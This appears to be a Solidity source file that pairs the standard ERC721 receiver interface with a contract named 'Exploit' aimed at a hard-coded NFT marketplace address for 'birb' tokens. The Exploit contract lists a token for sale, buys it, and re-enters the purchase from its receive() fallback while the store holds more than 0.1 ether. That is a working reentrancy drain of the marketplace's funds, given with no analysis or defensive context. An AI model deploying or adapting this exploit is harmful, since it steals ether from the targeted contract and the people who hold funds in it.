// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title ERC721 token receiver interface
 * @dev Interface for any contract that wants to support safeTransfers
 * from ERC721 asset contracts.
 */
interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface Gen2Contract{
  function multiBuy(uint[] memory birbIds) external payable;
  function multiDepositForSale(uint[] memory birbIds, uint[] memory birbPrices, uint expireBlock) external;
}

contract Exploit is IERC721Receiver{
  address internal storeAddress = 0xadc721ABF32BE937284bE47Ea80228550cd06702;

  constructor() {
    
  }

  function sell() public{
    uint[] memory birb = new uint[](1);
    uint[] memory prices = new uint[](1);
    birb[0] = 8200;
    prices[0] = 0.01 ether;
    Gen2Contract(storeAddress).multiDepositForSale(birb,prices,0);
  }

  function buy() public{
    uint[] memory birb = new uint[](1);
    birb[0] = 8200;
    Gen2Contract(storeAddress).multiBuy{value: 0.1 ether}(birb);
  }

  receive() external payable {
    if(storeAddress.balance > 0.1 ether){
      buy();
    }
  }

  function onERC721Received(address operator, address from, uint256 tokenId, bytes memory) public virtual override returns (bytes4) {
    return this.onERC721Received.selector;
  }

}

